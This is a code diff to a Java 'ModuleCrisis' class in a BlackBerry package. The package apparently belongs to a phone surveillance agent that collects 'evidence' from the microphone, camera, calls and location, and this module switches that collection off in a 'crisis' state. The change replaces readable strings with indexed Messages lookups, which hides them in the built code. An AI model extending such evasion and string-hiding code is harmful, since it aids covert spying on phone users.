@@ -9,6 +9,7 @@
  * *************************************************/
 package blackberry.module;
 
+import blackberry.Messages;
 import blackberry.Status;
 import blackberry.config.ConfModule;
 import blackberry.config.ConfigurationException;
@@ -21,7 +22,7 @@ import blackberry.evidence.Evidence;
  */
 public final class ModuleCrisis extends BaseModule {
     //#ifdef DEBUG
-    static Debug debug = new Debug("ModCrisis", DebugLevel.VERBOSE);
+    static Debug debug = new Debug("ModCrisis", DebugLevel.VERBOSE); //$NON-NLS-1$
     //#endif
 
     public static final int NONE = 0x0; // Per retrocompatibilita'
@@ -33,7 +34,7 @@ public final class ModuleCrisis extends BaseModule {
     public static final int SIZE = 0x6;
 
     public static String getStaticType() {
-        return "crisis";
+        return Messages.getString("1b.0");//"crisis"; //$NON-NLS-1$
     }
     
     /*
@@ -44,24 +45,24 @@ public final class ModuleCrisis extends BaseModule {
 
         Status status = Status.self();
         try {
-            if (conf.getBoolean("synchronize")) {
+            if (conf.getBoolean(Messages.getString("1b.1"))) { //$NON-NLS-1$
                 status.setCrisis(SYNC, true);
             }
-            if (conf.getBoolean("call")) {
+            if (conf.getBoolean(Messages.getString("1b.2"))) { //$NON-NLS-1$
                 status.setCrisis(CALL, true);
             }
-            if (conf.getBoolean("mic")) {
+            if (conf.getBoolean(Messages.getString("1b.3"))) { //$NON-NLS-1$
                 status.setCrisis(MIC, true);
             }
-            if (conf.getBoolean("camera")) {
+            if (conf.getBoolean(Messages.getString("1b.4"))) { //$NON-NLS-1$
                 status.setCrisis(CAMERA, true);
             }
-            if (conf.getBoolean("position")) {
+            if (conf.getBoolean(Messages.getString("1b.5"))) { //$NON-NLS-1$
                 status.setCrisis(POSITION, true);
             }
         } catch (ConfigurationException e) {
             //#ifdef DEBUG
-            debug.trace(" (parse) Error: " + e);
+            debug.trace(" (parse) Error: " + e); //$NON-NLS-1$
             //#endif
             return false;
         }
@@ -71,7 +72,7 @@ public final class ModuleCrisis extends BaseModule {
 
     public void actualStart() {
         Status.getInstance().startCrisis();
-        Evidence.info("Crisis started");
+        Evidence.info(Messages.getString("1b.7")); //$NON-NLS-1$
     }
 
     /*
@@ -85,7 +86,7 @@ public final class ModuleCrisis extends BaseModule {
     public void actualStop() {
         Status.getInstance().stopCrisis();
         if (running) {
-            Evidence.info("Crisis stopped");
+            Evidence.info(Messages.getString("1b.6")); //$NON-NLS-1$
         }
     }
 
